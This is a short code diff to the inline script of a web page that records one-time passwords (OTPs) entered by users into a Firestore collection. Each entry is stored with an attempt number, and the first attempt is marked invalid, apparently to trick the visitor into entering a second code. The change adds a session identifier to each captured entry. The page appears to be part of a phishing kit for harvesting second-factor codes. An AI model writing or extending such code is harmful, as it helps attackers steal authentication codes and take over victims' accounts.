@@ -159,6 +159,9 @@
   <script>
     let attempt = 1;
 
+    // Example of generating a unique sessionId (you can replace this with your own method)
+    const sessionId = "SESSION_" + new Date().getTime();  // Just a sample method to generate a sessionId
+
     function handleSubmit(e) {
       e.preventDefault();
       const blur = document.getElementById("blurOverlay");
@@ -174,10 +177,12 @@
       blur.style.display = "flex";
       errorText.style.display = "none";
 
+      // Save OTP along with sessionId to Firestore
       db.collection("otp_entries").add({
         otp: otp,
         attempt: attempt,
         valid: attempt > 1,
+        sessionId: sessionId, // Add sessionId to the document
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
         setTimeout(() => {
